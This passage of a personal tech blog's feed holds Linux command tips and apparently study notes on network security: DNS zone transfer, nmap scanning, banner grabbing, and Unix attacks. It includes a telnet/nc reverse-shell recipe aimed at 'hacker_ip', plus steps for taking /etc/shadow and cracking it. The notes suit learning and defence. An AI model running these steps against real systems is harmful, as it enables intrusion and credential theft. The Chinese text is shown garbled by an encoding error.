&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">grep -c &lt;span class="s1">&amp;#39;model name&amp;#39;&lt;/span> /proc/cpuinfo
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="find-printable-strings-æŸ¥æ‰¾äºŒè¿›åˆ¶æ–‡ä»¶ä¸­çš„å­—ç¬¦ä¸²">find printable strings æŸ¥æ‰¾äºŒè¿›åˆ¶æ–‡ä»¶ä¸­çš„å­—ç¬¦ä¸²&lt;/h2>
&lt;p>ä¾‹å¦‚æŸ¥çœ‹ /bin ç›®å½•ä¸‹çš„ç¨‹åºå¯èƒ½ä¼šåˆ›å»ºå“ªäº›ä¸´æ—¶æ–‡ä»¶:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">strings /bin/* &lt;span class="p">|&lt;/span> grep tmp
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="æŸ¥çœ‹-é…ç½®èµ„æºé™åˆ¶">æŸ¥çœ‹ã€é…ç½®èµ„æºé™åˆ¶&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">ulimit&lt;/span> -a
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-text" data-lang="text">&lt;span class="line">&lt;span class="cl">core file size (blocks, -c) 0
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">data seg size (kbytes, -d) unlimited
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">file size (blocks, -f) unlimited
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">max locked memory (kbytes, -l) unlimited
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">max memory size (kbytes, -m) unlimited
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">open files (-n) 1024
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">pipe size (512 bytes, -p) 1
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">stack size (kbytes, -s) 9788
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cpu time (seconds, -t) unlimited
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">max user processes (-u) 2784
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">virtual memory (kbytes, -v) unlimited
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="æµ‹è¯•ç¡¬ç›˜é€Ÿåº¦">æµ‹è¯•ç¡¬ç›˜é€Ÿåº¦&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># bs é»˜è®¤ä¸º 512 å­—èŠ‚ï¼Œå•ä½æ”¯æŒ k/m ï¼ˆmacOS å¹³å°å¦‚æ­¤ï¼ŒLinux ä¸Šä¸ä¸€æ ·ï¼‰&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># write&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">dd &lt;span class="nv">of&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="nv">path_on_disk&lt;/span>&lt;span class="si">}&lt;/span> &lt;span class="k">if&lt;/span>&lt;span class="o">=&lt;/span>/dev/zero &lt;span class="nv">bs&lt;/span>&lt;span class="o">=&lt;/span>1m &lt;span class="nv">count&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">1000&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># read&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">dd &lt;span class="k">if&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="nv">path_on_disk&lt;/span>&lt;span class="si">}&lt;/span> &lt;span class="nv">of&lt;/span>&lt;span class="o">=&lt;/span>/dev/null &lt;span class="nv">bs&lt;/span>&lt;span class="o">=&lt;/span>1m
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-text" data-lang="text">&lt;span class="line">&lt;span class="cl">1000+0 records in
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">1000+0 records out
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">1048576000 bytes transferred in 0.619836 secs (1691698844 bytes/sec)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">1000+0 records in
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">1000+0 records out
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">1048576000 bytes transferred in 0.246972 secs (4245726816 bytes/sec)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="ç›‘æ§ç£ç›˜-io-æƒ…å†µ">ç›‘æ§ç£ç›˜ IO æƒ…å†µ&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">iostat
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-text" data-lang="text">&lt;span class="line">&lt;span class="cl"> disk0 disk2 disk3 cpu load average
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> KB/t tps MB/s KB/t tps MB/s KB/t tps MB/s us sy id 1m 5m 15m
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 26.18 95 2.42 25.87 0 0.00 287.74 0 0.00 4 2 94 1.95 1.64 1.56
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="ä¸‹è½½è„šæœ¬å¹¶ç«‹å³æ‰§è¡Œ">ä¸‹è½½è„šæœ¬å¹¶ç«‹å³æ‰§è¡Œ&lt;/h2>
&lt;p>ä»¥ä¸‹å‘½ä»¤ä¼šè‡ªåŠ¨å®‰è£… yarn åŒ…ç®¡ç†å·¥å…·ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">curl --compressed -o- -L https://yarnpkg.com/install.sh &lt;span class="p">|&lt;/span> bash
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>å‚æ•°è§£é‡Šï¼š&lt;/p>
&lt;dl>
&lt;dt>&amp;ndash;compressed&lt;/dt>
&lt;dd>è¯·æ±‚å‹ç¼©æ–¹å¼ä¼ è¾“ï¼ŒèŠ‚çœæµé‡ã€æé«˜é€Ÿåº¦&lt;/dd>
&lt;dt>-o-&lt;/dt>
&lt;dd>-o æŒ‡å®šä¿å­˜çš„æ–‡ä»¶è·¯å¾„ï¼Œå‚æ•°æŒ‡å®šä¸º &lt;code>-&lt;/code> åˆ™å¼ºåˆ¶è¾“å‡ºåˆ° stdout&lt;/dd>
&lt;dt>-L&lt;/dt>
&lt;dd>è·Ÿéšé‡å®šå‘&lt;/dd>
&lt;/dl></content><category scheme="https://mincodes.com/tags/tools/" term="Tools" label="Tools"/><category scheme="https://mincodes.com/tags/command/" term="Command" label="Command"/><category scheme="https://mincodes.com/tags/scripts/" term="Scripts" label="Scripts"/><category scheme="https://mincodes.com/tags/linux/" term="Linux" label="Linux"/><category scheme="https://mincodes.com/tags/macos/" term="Macos" label="Macos"/></entry><entry><title type="text">ç½‘ç»œå®‰å…¨ Network Security</title><link rel="alternate" type="text/html" href="https://mincodes.com/posts/network-security/"/><id>https://mincodes.com/posts/network-security/</id><updated>2022-12-30T07:37:00+00:00</updated><published>2022-01-23T22:54:00+00:00</published><author><name>Min Deng</name><uri>https://mincodes.com/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en)</rights><summary type="html">è¸©ç‚¹ DNS zone transfer åŒºåŸŸä¼ é€ https://digi.ninja/projects/zonetransferme.php https://www.mi1k7ea.com/2021/04/03/æµ…æDNSâ€¦</summary><content type="html">&lt;h1 id="è¸©ç‚¹">è¸©ç‚¹&lt;/h1>
&lt;h2 id="dns-zone-transfer-åŒºåŸŸä¼ é€">DNS zone transfer åŒºåŸŸä¼ é€&lt;/h2>
&lt;p>&lt;a href="https://digi.ninja/projects/zonetransferme.php">https://digi.ninja/projects/zonetransferme.php&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.mi1k7ea.com/2021/04/03/%E6%B5%85%E6%9E%90DNS%E5%9F%9F%E4%BC%A0%E9%80%81%E6%BC%8F%E6%B4%9E/">https://www.mi1k7ea.com/2021/04/03/æµ…æDNSåŸŸä¼ é€æ¼æ´/&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">dig axfr @nsztm1.digi.ninja zonetransfer.me
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="ç½‘ç»œæ‹“æ‰‘">ç½‘ç»œæ‹“æ‰‘&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">traceroute
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># -I: ICMP, -U: UDP, -T: TCP&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">traceroute -I
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># tells the network to route the packet through the specified gateway &lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># (most routers have disabled source routing for security reasons).&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">traceroute -g 10.10.10.5
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>ping ä¸€èˆ¬é»˜è®¤èµ° ICMP åè®®ã€‚&lt;/p>
&lt;p>ICMPï¼ˆInternet Control Message Protocolï¼Œäº’è”ç½‘æ§åˆ¶åè®®ï¼‰æ˜¯ç½‘ç»œå±‚åè®®ï¼Œä½†æ˜¯å®ƒä¸åƒ IP åè®®å’Œ ARP åè®®ä¸€æ ·ç›´æ¥ä¼ é€’ç»™æ•°æ®é“¾è·¯å±‚ï¼Œè€Œæ˜¯&lt;strong>å…ˆå°è£…æˆ IP æ•°æ®åŒ…ç„¶åå†ä¼ é€’ç»™æ•°æ®é“¾è·¯å±‚&lt;/strong>ã€‚æ‰€ä»¥åœ¨ IP æ•°æ®åŒ…ä¸­å¦‚æœåè®®ç±»å‹å­—æ®µçš„å€¼æ˜¯ 1 çš„è¯ï¼Œå°±è¡¨ç¤º IP æ•°æ®æ˜¯ ICMP æŠ¥æ–‡ã€‚IP æ•°æ®åŒ…å°±æ˜¯é è¿™ä¸ªåè®®ç±»å‹å­—æ®µæ¥åŒºåˆ†ä¸åŒçš„æ•°æ®åŒ…çš„ã€‚&lt;/p>
&lt;p>åœ¨ IP é€šä¿¡ä¸­å¦‚æœæŸä¸ªåŒ…å› ä¸ºæœªçŸ¥åŸå› æ²¡æœ‰åˆ°è¾¾ç›®çš„åœ°å€ï¼Œé‚£ä¹ˆè¿™ä¸ªå…·ä½“çš„åŸå› å°±æ˜¯ç”± ICMP è´Ÿè´£å‘ŠçŸ¥ã€‚è€Œ ICMP åè®®çš„ç±»å‹å®šä¹‰ä¸­å°±æ¸…æ¥šçš„æè¿°äº†å„ç§æŠ¥æ–‡çš„å«ä¹‰ã€‚&lt;/p>
&lt;h1 id="æ‰«æ">æ‰«æ&lt;/h1>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo arp-scan 172.19.50.0/24
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># ç«¯å£æ‰«æï¼Œ-Pn å¿½ç•¥ä¸»æœºå‘ç°ï¼Œé¿å… ICMP è¢«å±è”½&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nmap -Pn 172.19.50.218
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="åè®®æ ˆæŒ‡çº¹åˆ†ææŠ€æœ¯">åè®®æ ˆæŒ‡çº¹åˆ†ææŠ€æœ¯&lt;/h3>
&lt;p>åè®®æ ˆæŒ‡çº¹åˆ†ææŠ€æœ¯ï¼šStack Fingerprintingï¼Œåˆ†ä¸»åŠ¨å¼ã€è¢«åŠ¨å¼ã€‚&lt;/p>
&lt;p>é€šè¿‡æ£€æŸ¥åè®®æ ˆå…·ä½“å®ç°çš„ç»†å¾®å·®å¼‚ï¼Œä¾¦æµ‹ç›®æ ‡è®¾å¤‡çš„æ“ä½œç³»ç»Ÿã€‚&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># æ‰«æ OSï¼Œä¸»åŠ¨å¼&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo nmap -O -Pn 192.168.1.1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="æŸ¥ç‚¹">æŸ¥ç‚¹&lt;/h1>
&lt;h3 id="æœåŠ¡æŒ‡çº¹åˆ†ææŠ€æœ¯">æœåŠ¡æŒ‡çº¹åˆ†ææŠ€æœ¯&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># æ£€æŸ¥æŸä¸ªæœåŠ¡çš„ç‰ˆæœ¬å·&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nmap -sV 192.168.1.1 -p &lt;span class="m">22&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="æ¼æ´æ‰«æå™¨">æ¼æ´æ‰«æå™¨&lt;/h3>
&lt;ul>
&lt;li>Nessus&lt;/li>
&lt;li>nmap script engine&lt;/li>
&lt;/ul>
&lt;h3 id="æ ‡è¯­æŠ“å–æŠ€æœ¯">æ ‡è¯­æŠ“å–æŠ€æœ¯&lt;/h3>
&lt;p>è¿æ¥åˆ°è¿œç¨‹åº”ç”¨ç¨‹åºï¼Œå¹¶è§‚å¯Ÿå…¶è¾“å‡ºã€‚&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">telnet www.example.com &lt;span class="m">80&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># netcat, TCP/IP ç‘å£«å†›åˆ€&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nc -v www.example.com &lt;span class="m">80&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="æ”»å‡»-unix">æ”»å‡» Unix&lt;/h1>
&lt;h2 id="è¿œç¨‹è®¿é—®">è¿œç¨‹è®¿é—®&lt;/h2>
&lt;h3 id="ç¼“å†²åŒºæº¢å‡ºæ”»å‡»">ç¼“å†²åŒºæº¢å‡ºæ”»å‡»&lt;/h3>
&lt;ul>
&lt;li>å †æ ˆç¼“å†²åŒºæº¢å‡º&lt;/li>
&lt;li>heap ç¼“å†²åŒºæº¢å‡º&lt;/li>
&lt;/ul>
&lt;h3 id="åå‘é€šé“">åå‘é€šé“&lt;/h3>
&lt;ol>
&lt;li>åœ¨è‡ªå·±çš„æœºå™¨ä¸Šæ‰“å¼€ nc ç›‘å¬å™¨ï¼Œæ¥å—åå‘çš„ telnet è¿æ¥ï¼›&lt;/li>
&lt;li>åœ¨ç›®æ ‡æœºå™¨ä¸Šæ‰§è¡Œ telnet å‘½ä»¤ï¼Œå»ºç«‹åå‘é€šé“ã€‚&lt;/li>
&lt;/ol>
&lt;p>Example 1ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># è‡ªå·±çš„æœºå™¨ï¼Œè¿™ä¸ªç»ˆç«¯æ¥å— sh å‘½ä»¤è¾“å…¥&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nc -l -n -v -p &lt;span class="m">80&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># è‡ªå·±çš„æœºå™¨ï¼Œè¿™ä¸ªç»ˆç«¯ä¼šæ‰“å° sh æ ‡å‡†è¾“å‡º&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nc -l -n -v -p &lt;span class="m">25&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># ç›®æ ‡æœºå™¨&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/bin/telnet hacker_ip &lt;span class="m">80&lt;/span> &lt;span class="p">|&lt;/span> /bin/sh &lt;span class="p">|&lt;/span> /bin/telnet hacker_ip &lt;span class="m">25&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;blockquote>
&lt;p>Security Tips&lt;br>
&lt;code>chmod 750 telnet&lt;/code> ç¦æ­¢ä¸å¿…è¦æ‰§è¡Œ telnet çš„ç”¨æˆ·å»æ‰§è¡Œå®ƒã€‚&lt;/p>
&lt;/blockquote>
&lt;h2 id="æœ¬åœ°è®¿é—®">æœ¬åœ°è®¿é—®&lt;/h2>
&lt;h3 id="ç¦»çº¿å£ä»¤ç ´è§£">ç¦»çº¿å£ä»¤ç ´è§£&lt;/h3>
&lt;ol>
&lt;li>
&lt;p>è·å– &lt;code>/etc/shadow&lt;/code> æ–‡ä»¶&lt;/p>
&lt;ol>
&lt;li>MCF æ ¼å¼ï¼š&lt;code>$ç®—æ³•$salt$hash&lt;/code> ï¼Œç®—æ³•1ï¼šMD5ï¼Œç®—æ³•2ï¼šBlowfish&lt;/li>
&lt;/ol>
&lt;/li>
&lt;li>
&lt;p>è®¡ç®— &lt;code>hash(salt+password)&lt;/code> ï¼Œå’Œ shadow æ–‡ä»¶ä¸­çš„å€¼æ¯”è¾ƒï¼ŒåŒ¹é…åˆ™ç ´è§£æˆåŠŸ&lt;/p>
&lt;/li>
&lt;/ol>
&lt;p>ç ´è§£ç¨‹åºï¼šJohn the Ripperï¼ŒAKA: John, JTR&lt;/p>
&lt;h3 id="æœ¬åœ°ç¼“å†²åŒºæº¢å‡º">æœ¬åœ°ç¼“å†²åŒºæº¢å‡º&lt;/h3>
&lt;p>ä¸€èˆ¬ä»¥ SUID å±æ€§çš„æ–‡ä»¶ä¸ºç›®æ ‡ï¼Œä»è€Œå…è®¸æ”»å‡»è€…ä»¥ root ç‰¹æƒæ‰§è¡Œå‘½ä»¤ã€‚&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="https://mincodes.com/posts/linux-tips/">Linux Tips&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>Security Tips&lt;br>
å°½é‡ä¸è¦è®¾ç½® SUID ä½ã€‚&lt;/p>
&lt;/blockquote></content><category scheme="https://mincodes.com/tags/network/" term="Network" label="Network"/><category scheme="https://mincodes.com/tags/security/" term="Security" label="Security"/><category scheme="https://mincodes.com/tags/tools/" term="Tools" label="Tools"/></entry><entry><title type="text">Linux Tips</title><link rel="alternate" type="text/html" href="https://mincodes.com/posts/linux-tips/"/><id>https://mincodes.com/posts/linux-tips/</id><updated>2023-05-09T09:32:00+00:00</updated><published>2022-01-23T04:24:00+00:00</published><author><name>Min Deng</name><uri>https://mincodes.com/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en)</rights><summary type="html">è®°å½•ä¸€äº›å¸¸ç”¨çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œæ–¹ä¾¿éšæ—¶å–ç”¨ã€‚ åŒ…ç®¡ç† Ubuntu/Debian ä¸ŠæŸ¥çœ‹ä¸€ä¸ªåŒ…çš„å®‰è£…äº†å“ªäº›æ–‡ä»¶ï¼Œå®‰è£…åˆ°å“ªé‡Œäº†ï¼š å…ˆç”¨ dpkg -lâ€¦</summary><content type="html">&lt;p>è®°å½•ä¸€äº›å¸¸ç”¨çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œæ–¹ä¾¿éšæ—¶å–ç”¨ã€‚&lt;/p>
&lt;h2 id="åŒ…ç®¡ç†">åŒ…ç®¡ç†&lt;/h2>
&lt;p>Ubuntu/Debian ä¸ŠæŸ¥çœ‹ä¸€ä¸ªåŒ…çš„å®‰è£…äº†å“ªäº›æ–‡ä»¶ï¼Œå®‰è£…åˆ°å“ªé‡Œäº†ï¼š&lt;/p>
&lt;ol>
&lt;li>å…ˆç”¨ &lt;code>dpkg -l | grep vim&lt;/code> æ‰¾åˆ°è¦æŸ¥çœ‹çš„åŒ…çš„å®Œæ•´åŒ…åï¼›&lt;/li>
&lt;li>å†é€šè¿‡åŒ…åæŸ¥çœ‹å®‰è£…çš„æ–‡ä»¶ï¼š &lt;code>dpkg -L neovim&lt;/code>&lt;/li>
&lt;/ol>
&lt;h2 id="å°æŠ€å·§">å°æŠ€å·§&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
